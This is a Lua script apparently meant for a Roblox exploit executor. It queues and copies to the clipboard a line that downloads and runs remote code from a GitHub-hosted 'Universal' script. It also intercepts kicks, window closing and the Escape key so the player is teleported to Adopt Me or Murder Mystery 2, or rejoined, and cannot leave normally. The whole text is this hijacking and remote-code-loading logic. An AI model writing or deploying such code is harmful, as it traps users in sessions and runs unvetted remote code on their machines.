-- Clipboard Helper Function
local function copyToClipboard(text)
    if setclipboard then
        setclipboard(text)
    elseif toclipboard then
        toclipboard(text)
    end
end

-- Queue on Teleport Helper Function
local function queueOnTeleport(code)
    local queue = queue_on_teleport or (syn and syn.queue_on_teleport)
    if queue then
        pcall(queue, code)
    end
end

-- Redirect / Rejoin Interceptor Logic
local function redirectOrRejoin()
    pcall(function()
        local universalScript = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/ZyrikScript/Sodium/refs/heads/main/Universal"))()'
        queueOnTeleport(universalScript)
        copyToClipboard(universalScript)

        -- Choose randomly between Adopt Me (920587237) and MM2 (142823291)
        local targets = {920587237, 142823291}
        local randomTarget = targets[math.random(1, #targets)]

        -- Setup fallback mechanism if the target teleport fails (e.g. third-party teleports disabled)
        local connection
        connection = TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
            if player == localPlayer then
                if connection then connection:Disconnect() end
                -- Fallback: Rejoin current game
                pcall(function()
                    TeleportService:Teleport(game.PlaceId, localPlayer)
                end)
            end
        end)

        -- Attempt redirect to the random target game
        local success, err = pcall(function()
            TeleportService:Teleport(randomTarget, localPlayer)
        end)

        if not success then
            if connection then connection:Disconnect() end
            -- Fallback: Rejoin current game
            pcall(function()
                TeleportService:Teleport(game.PlaceId, localPlayer)
            end)
        end
    end)
end

-- 1. Detect Kicks or Disconnects
GuiService.ErrorMessageChanged:Connect(function()
    redirectOrRejoin()
end)

-- 2. Detect Esc Menu Leave / Closed Window
pcall(function()
    game:BindToClose(function()
        redirectOrRejoin()
        task.wait(3) -- Give the engine time to process the teleport request packet
    end)
end)

-- 3. Intercept Escape Key Input (Triggers teleport flow instantly)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.Escape then
        redirectOrRejoin()
    end
end)

